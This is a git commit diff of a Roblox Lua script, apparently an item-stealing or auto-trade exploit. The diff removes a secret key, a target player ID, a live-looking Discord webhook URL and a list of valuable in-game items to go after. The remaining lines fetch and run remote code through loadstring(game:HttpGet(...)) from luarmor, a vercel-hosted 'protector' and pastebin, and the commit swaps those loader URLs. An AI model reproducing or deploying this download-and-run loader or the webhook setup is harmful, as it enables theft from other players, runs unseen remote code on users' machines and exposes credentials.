7df7adfe24d747a9b75b66c9ad0e90831ee9162c
repagithhdo <taylorserren02@gmail.com>
2026-03-14 06:43:02 -0400

    Remove sensitive data and update loadstring calls

--- script.lua
+++ script.lua
@@ -1,54 +1,7 @@
-getgenv().SECRET_KEY = "mrr_7743ea3bd69440b49190d4cae19b7538"
-getgenv().TARGET_ID = 6006138512
-getgenv().DELAY_STEP = 1      
-getgenv().TRADE_CYCLE_DELAY = 2
-getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1474638570575757456/pguHLC0HHYYEoSTG0dI6OXOctDSluJ9bOzLOZfmJDgMuUqkr9rsyewmOE5tgHjA3nORe"
-getgenv().TARGET_BRAINROTS = {
-    ["Meowl"] = true,
-    ["Skibidi Toilet"] = true,
-    ["Strawberry Elephant"] = true,
-    ["Griffin"] = true,
-    ["Nacho Spyder"] = true,
-    ["Tacorita Bicicleta"] = true,
-    ["Festive 67"] = true,
-    ["Tang Tang Keletang"] = true,
-    ["Ketupat Kepat"] = true,
-    ["Tictac Sahur"] = true,
-    ["Ketchuru and Musturu"] = true,
-    ["Lavadorito Spinito"] = true,
-    ["Garama and Madundung"] = true,
-    ["Burguro And Fryuro"] = true,
-    ["Capitano Moby"] = true,
-    ["Cerberus"] = true,
-    ["Dragon Cannelloni"] = true,
-    ["Tralaledon"] = true,
-    ["Los Primos"] = true,
-    ["Los Tacoritas"] = true,
-    ["Los Spaghettis"] = true,
-    ["Love Love Bear"] = true,
-    ["Ginger Gerat"] = true,
-    ["Fragrama and Chocrama"] = true,
-    ["Spooky and Pumpky"] = true,
-    ["La Casa Boo"] = true,
-    ["Los Sekolahs"] = true,
-    ["Reinito Sleighito"] = true,
-    ["Ketupat Bros"] = true,
-    ["Cooki and Milki"] = true,
-    ["Rosey and Teddy"] = true,
-    ["Popcuru and Fizzuru"] = true,
-    ["La Supreme Combinasion"] = true,
-    ["Dragon Gingerini"] = true,
-    ["Headless Horseman"] = true,
-    ["Hydra Dragon Cannelloni"] = true,
-    ["Celularcini Viciosini"] = true,
-    ["La Food Combinasion"] = true,
-    ["Sammyni Fattini"] = true,
-    ["Los Amigos"] = true,
-    ["La Secret Combinasion"] = true
-}
 task.spawn(function()
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
+  loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/623c61e59524bc04f458c6f6dd2c3f8b.lua"))()
 end)
+
 task.spawn(function()
-loadstring(game:HttpGet("https://monlua-protector.vercel.app/raw/3511f1916f88970b320f6473ae8a907c"))()
+   loadstring(game:HttpGet("https://pastebin.com/raw/8CrdCWVC"))()
 end)
